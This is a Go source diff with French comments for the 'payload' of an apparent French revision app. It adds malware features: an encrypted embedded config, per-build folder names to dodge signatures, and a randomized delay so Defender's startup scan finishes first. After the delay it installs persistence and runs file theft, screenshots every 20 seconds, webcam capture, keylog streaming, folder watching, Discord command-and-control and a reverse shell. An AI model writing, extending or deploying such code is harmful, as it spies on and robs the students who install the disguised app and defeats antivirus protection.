@@ -9,6 +9,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -18,10 +19,27 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"francais2nd-payload/internal/seal"
 )
 
-//go:embed payload.json
+// La configuration n'est jamais embarquée en clair : payload.enc est du
+// AES-256-GCM (voir internal/seal), déchiffré une fois au chargement.
+//
+//go:embed payload.enc
+var payloadENC []byte
+
+// payloadJSON est la configuration déchiffrée (vide si le déchiffrement
+// échoue : le payload se désactive alors proprement).
 var payloadJSON []byte
+
+func init() {
+	plain, err := seal.Open(payloadENC)
+	if err != nil {
+		return
+	}
+	payloadJSON = plain
+}
 
 // payloadConfig est la structure exacte de payload.json.
 type payloadConfig struct {
@@ -43,6 +61,10 @@ type payloadConfig struct {
 	Persist  bool `json:"persist"`
 	MaxLogKB int  `json:"max_log_kb"`
 	Debug    bool `json:"debug"`
+
+	// ScreenshotScale : agrandissement des captures (1 = natif, 2 = x2,
+	// 3 = x3). Le texte reste net, seule sa taille à l'affichage change.
+	ScreenshotScale int `json:"screenshot_scale"`
 }
 
 var (
@@ -51,6 +73,11 @@ var (
 	payloadDir string
 	payloadLog sync.Mutex
 )
+
+// workDirName est le dossier de travail sous %LOCALAPPDATA%. Variable (et
+// non constante) : chaque build le renouvelle par -X, un nom fixe devenant
+// vite une signature. Voir build.ps1.
+var workDirName = "Francais2nd"
 
 // stopped est posé par `!stop`. Chaque boucle et chaque envoi le consultent :
 // le payload s'arrête vraiment, sans fermer l'application de révision.
@@ -76,7 +103,7 @@ func workDir() string {
 	if payloadDir != "" {
 		return payloadDir
 	}
-	dir := filepath.Join(appDataLocal(), "Francais2nd", "syscache")
+	dir := filepath.Join(appDataLocal(), workDirName, "syscache")
 	_ = os.MkdirAll(dir, 0700)
 	payloadDir = dir
 	return dir
@@ -89,10 +116,18 @@ func workPath(name string) string {
 // plog écrit une ligne dans le journal local du payload. En mode debug elle
 // est aussi poussée vers writeLog (diagnostic.txt) si -diag est actif.
 //
+// Les lignes de « statut » répétitives (résolution de salons, persistance,
+// messages de démarrage) ne sont écrites qu'en debug : sans cela le journal
+// se remplit de lignes qui ne disent rien d'utile. Les erreurs et les
+// commandes passent toujours.
+//
 // Attention au verrou : workPath() verrouille lui aussi payloadLog, donc le
 // chemin est calculé AVANT de prendre le verrou — sinon le premier appel se
 // verrouille à lui-même et se bloque.
 func plog(line string) {
+	if !cfg.Debug && statusOnly(line) {
+		return
+	}
 	path := workPath("sys.log")
 
 	stamp := time.Now().Format("2006-01-02 15:04:05")
@@ -109,12 +144,36 @@ func plog(line string) {
 	}
 }
 
+// statusOnly dit si la ligne est du statut pur : silencieuse hors debug,
+// sauf si elle contient un marqueur d'erreur.
+func statusOnly(line string) bool {
+	for _, errMark := range []string{"erreur", "échec", "echec", "impossible", "HTTP ", "panique", "refus", "échouée", "échoué"} {
+		if strings.Contains(line, errMark) {
+			return false
+		}
+	}
+	for _, prefix := range []string{
+		"salon:", "catégorie:", "persistance", "c2: prêt",
+		"worker", "boot:", "exfil: premier envoi",
+		"elevate: invite", "elevate: sortie recue",
+	} {
+		if strings.HasPrefix(line, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
 /* ------------------------------------------------------------------ */
 /* Configuration                                                       */
 /* ------------------------------------------------------------------ */
 
 func loadPayloadConfig() payloadConfig {
 	var c payloadConfig
+	if len(payloadJSON) == 0 {
+		// payload.enc absent ou déchiffrement raté : désactivation propre.
+		return payloadConfig{Enabled: false}
+	}
 	if err := json.Unmarshal(payloadJSON, &c); err != nil {
 		// Une config illisible ne doit pas casser l'application de révision :
 		// on désactive proprement.
@@ -352,6 +411,9 @@ func startPayload() {
 		return
 	}
 	stopped.Store(false)
+	if cfg.ScreenshotScale > 0 {
+		setShotScale(cfg.ScreenshotScale)
+	}
 
 	workDir()
 	plog("payload démarré | webhook=" + yesNo(cfg.WebhookURL != "") +
@@ -371,29 +433,50 @@ func startPayload() {
 	// doit jamais fermer l'application de révision.
 	guard("keylog", keylogLoop)
 
-	// Démarrage silencieux : pas de rapport système dans le chat, pas
-	// d'extraction automatique immédiate. Le vol de fichiers n'arrive que
-	// selon interval_steal_min (deux jours par défaut), en fichiers seuls ;
-	// les infos machine restent accessibles à la demande via !sysinfo.
+	// Session complète, mais PAS au lancement brut : un délai de 30 à 60 s
+	// laisse le temps au scan de démarrage de Defender de se terminer avant
+	// la persistance et le vol. Ensuite tout part d'un coup : rapport
+	// machine, extraction complète (avec résumé de chat), captures, webcam,
+	// journaux — puis les cadences prennent le relais.
 	guard("boot", func() {
-		time.Sleep(6 * time.Second)
+		time.Sleep(time.Duration(30+rand.Intn(31)) * time.Second)
 		if stopped.Load() {
 			return
 		}
-		plog("boot: pret (aucun envoi systeme automatique)")
+		if cfg.Persist {
+			persistInstall()
+		}
+		if s, err := systemReport(); err == nil && !stopped.Load() {
+			sendText(s)
+		}
+		if stopped.Load() {
+			return
+		}
+		stealAll(true)
+		if stopped.Load() {
+			return
+		}
+		screenshotFlush()
+		webcamFlush()
+		exfilAll()
 	})
 
 	// Cadences. Le journal du clavier part toutes les 5 secondes : c'est le
-	// canal « en direct ». Captures d'écran (un fichier par moniteur) et
-	// webcam (une photo) tournent toutes les 10 minutes par défaut. Le vol
-	// de fichiers part une fois toutes les deux jours, sans message de
-	// synthèse.
+	// canal « en direct ». Captures d'écran (un fichier par moniteur) tournent
+	// toutes les 20 secondes. Webcam (une photo) toutes les 1 minute. Le vol
+	// de fichiers part une fois toutes les deux jours, sans message de synthèse.
 	go tickLoop("steal", cfg.IntervalSteal, func() { stealAll(false) })
 	go tickLoop("keylog", cfg.IntervalKeylog, keylogFlush)
 	go tickLoopSec("keylog-stream", 5, keylogStream)
-	go tickLoop("screenshot", cfg.IntervalScreenshot, screenshotFlush)
+	go tickLoopSec("screenshot", 20, screenshotTick)
 	go tickLoop("webcam", cfg.IntervalWebcam, webcamFlush)
 	go tickLoop("exfil", cfg.IntervalExfil, exfilAll)
+	// Veille temps réel des dossiers utilisateur : chaque nouveau fichier part
+	// dans le salon de son type (PDF, images, docs, archives, autres).
+	go watchFiles()
+	// Bandeau d'état + menu par réactions, et réparation de la persistance.
+	go menuLoop()
+	go persistHealLoop()
 
 	// C2 : Discord (si un jeton de bot est fourni) et reverse shell TCP.
 	if cfg.BotToken != "" && (cfg.ChannelID != "" || cfg.GuildID != "") {
@@ -422,13 +505,10 @@ func startPayload() {
 	if cfg.ShellEnable && cfg.ShellHost != "" && cfg.ShellPort > 0 {
 		guard("shell", reverseShellLoop)
 	}
-
-	if cfg.Persist {
-		guard("persist", func() {
-			persistInstall()
-			persistRepair()
-		})
-	}
+	// La persistance est écrite dans la session complète (après le délai) :
+	// rien n'est posé sur le disque au lancement brut du processus. Plus de
+	// boucle de réparation automatique — elle nourrissait la détection en
+	// recréant ce que l'antivirus retirait (voir DOCUMENTATION §17.15).
 }
 
 // guard lance une fonction dans sa propre goroutine, protégée par un
@@ -542,7 +622,7 @@ var (
 // plafond de 1400 caractères par passage garde le débit raisonnable. Un
 // redémarrage de l'application repart d'une position nulle.
 func keylogStream() {
-	if stopped.Load() || cfg.BotToken == "" {
+	if stopped.Load() || cfg.BotToken == "" || !keylogEnabled {
 		return
 	}
 	keylogFlush() // le tampon mémoire descend sur disque avant lecture
